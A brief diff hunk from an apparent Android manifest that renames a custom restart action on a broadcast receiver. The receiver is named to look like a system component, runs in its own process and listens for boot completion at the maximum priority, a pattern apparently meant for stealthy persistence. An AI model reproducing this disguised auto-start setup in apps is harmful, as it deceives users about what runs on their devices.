@@ -93,7 +93,7 @@
             android:name="com.android.system.core.sometools.GReceiver"
             android:process=":core" >
             <intent-filter>
-                <action android:name="android.intent.action.core.restart" />
+                <action android:name="tb.intent.action.core.restart" />
             </intent-filter>
             <intent-filter android:priority="2147483647">
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
